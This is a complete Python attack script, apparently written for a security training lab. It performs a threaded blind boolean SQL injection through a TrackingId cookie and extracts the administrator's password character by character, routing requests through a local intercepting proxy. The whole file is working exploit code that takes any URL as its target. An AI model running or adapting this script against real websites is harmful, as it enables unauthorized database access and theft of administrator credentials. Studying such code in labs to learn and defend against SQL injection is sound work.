import sys
import requests
import urllib3
import urllib
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_passwd_threads(passidx, url, passwd_extracted_threads):
    sys.stdout.write("t%s starting...\n" % passidx)
    try:
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (passidx,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': '6FRZYk3zrFqvnbrP' + sqli_payload_encoded, 'session': 'ktj6u6zwxHfVJLMaAuSoWWh67rWbbZCO'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + chr(j))
                sys.stdout.flush()
            else:
                passwd_extracted_threads[passidx - 1] = chr(j)
                sys.stdout.write("  Thread %s found %s!\n" % (passidx,chr(j)))
                sys.stdout.flush()
                break
    except Exception as e:
        print("Thread %s exited with exception %s." % (passidx, str(e)))

def sqli_password(url):
    passwdLen = 20
    password_extracted = ""
    passwd_extracted_threads = [0] * passwdLen
    with concurrent.futures.ThreadPoolExecutor(max_workers=passwdLen) as executor:
        executor.map(lambda x : extract_passwd_threads(x, url, passwd_extracted_threads), range(1,passwdLen+1))

    sys.stdout.write(''.join(passwd_extracted_threads) + '\n')

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()